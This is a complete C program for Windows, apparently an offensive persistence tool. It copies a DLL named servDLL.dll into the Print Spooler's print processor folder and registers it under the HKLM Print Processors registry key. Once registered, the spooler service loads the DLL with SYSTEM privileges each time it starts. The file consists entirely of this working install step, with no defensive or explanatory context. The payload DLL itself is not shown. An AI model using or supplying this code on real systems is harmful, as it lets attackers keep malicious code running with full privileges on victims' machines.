#include <windows.h>
#include <stdio.h>

int main() {
    const char* srcPath = "servDLL.dll";
    const char* dstPath= "C:\\Windows\\System32\\spool\\prtprocs\\x64\\servDLL.dll";

    const char* dllName = "servDLL.dll";
    const char* regPath = "SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\servDLL";

    if (!CopyFileA(srcPath, dstPath, FALSE)) {
        printf("[-] Failed to copy file to C:\\Windows\\System32\\spool\\prtprocs\\x64\\servDLL.dll. Error: %lu\n", GetLastError());
        return 1;
    } else {
        printf("[+] Successfully copied DLL to C:\\Windows\\System32\\spool\\prtprocs\\x64\\servDLL.dll.\n");
    }

    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        printf("[-] Failed to create/open registry key.\n");
        return 1;
    }

    if (RegSetValueExA(hKey, "Driver", 0, REG_SZ, (const BYTE*)dllName, (DWORD)(strlen(dllName) + 1)) != ERROR_SUCCESS) {
        printf("[-] Failed to set registry value.\n");
    } else {
        printf("[+] Registry key and value successfully written.\n");
    }

    RegCloseKey(hKey);
    return 0;
}
